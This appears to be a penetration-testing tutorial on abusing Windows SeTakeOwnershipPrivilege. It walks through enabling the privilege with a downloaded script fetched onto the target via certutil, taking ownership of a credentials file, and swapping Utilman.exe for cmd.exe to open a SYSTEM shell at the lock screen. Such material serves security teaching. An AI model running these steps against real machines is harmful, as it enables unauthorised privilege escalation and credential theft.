---
legal-banner: true
---

### **Introduction**

`SeTakeOwnershipPrivilege` grants a user the ability to take ownership of any *securable object* such as Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes, This privilege assigns `WRITE_OWNER` rights, allowing the user to change the owner within the object’s security descriptor.  
While administrators have this privilege by default, it can also be granted to service accounts for specific tasks.

### **Step 1: Enabling SeTakeOwnershipPrivilege**

1.  Verify if the current user has `SeTakeOwnershipPrivilege`:  
    `whoami /priv`  
    
    ![](../../../img/Windows-Environment/169.png)
    
2.  Download the **EnableAllTokenPrivs.ps1** script:  
    `wget https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1`  
    
    ![](../../../img/Windows-Environment/170.png)
    
3.  Transfer the script to the target machine:  
    `certutil -urlcache -f http://[IP-ADDRESS]:80/EnableAllTokenPrivs.ps1 EnableAllTokenPrivs.ps1`  
    
    ![](../../../img/Windows-Environment/171.png)

4.  Import the script to enable the privilege:  
    `Import-Module .\EnableAllTokenPrivs.ps1`
    
5.  Verify that `SeTakeOwnershipPrivilege` is enabled:  
    `whoami /priv`  
    
    ![](../../../img/Windows-Environment/172.png)

### **Step 2: Choosing a target file**

1.  Identify a target file to take ownership of. In this example: `C:\Secrets\cred.txt`:  
    `Get-ChildItem -Path 'C:\Secrets\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}`  
    
    ![](../../../img/Windows-Environment/173.png)
    
2.  Check the ownership of the directory:  
    `cmd /c dir /q 'C:\Secrets'`  
    
    ![](../../../img/Windows-Environment/174.png)

### **Step 3: Taking ownership of the file**

1.  Change ownership of the file:  
    `takeown /f 'C:\Secrets\cred.txt'`  
    
    ![](../../../img/Windows-Environment/175.png)
    
2.  Confirm the ownership change:  
    `Get-ChildItem -Path 'C:\Secrets\cred.txt' | select name,directory,@{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}`  
    
    ![](../../../img/Windows-Environment/176.png)
    
3.  Grant your account full control with `icacls`:  
    `icacls 'C:\Secrets\cred.txt' /grant hackfast:F`  
    
    ![](../../../img/Windows-Environment/177.png)

    **Note:** Verify access by reading the file:  
    `cat 'C:\Secrets\cred.txt'`

### **Exploiting with Utilman**

1.  Since `Utilman.exe` runs with SYSTEM privileges, replacing it allows privilege escalation.  
    Check its current permissions:  
    `icacls "C:\Windows\System32\Utilman.exe"`  
    
    ![](../../../img/Windows-Environment/178.png)

2.  Take ownership of `utilman.exe`:  
    `takeown /f C:\Windows\System32\Utilman.exe`  
    
    ![](../../../img/Windows-Environment/179.png)

    **Note:** Ownership alone doesn’t grant access. However, the owner can assign new permissions.

3.  Grant full control over `utilman.exe`:  
    ```
    icacls C:\Windows\System32\Utilman.exe /grant hackfast:F
    icacls "C:\Windows\System32\Utilman.exe"
    ```  
    
    ![](../../../img/Windows-Environment/180.png)

4.  Replace `utilman.exe` with `cmd.exe` (backup the original first, if possible):  
    `copy cmd.exe utilman.exe`  
    
    ![](../../../img/Windows-Environment/181.png)

5.  Lock the screen from the Start menu:  
    
    ![](../../../img/Windows-Environment/182.png)

6.  Click the **Ease of Access** button.  
    Since `utilman.exe` was replaced with `cmd.exe`, a command prompt opens with SYSTEM privileges:  
    
    ![](../../../img/Windows-Environment/183.png)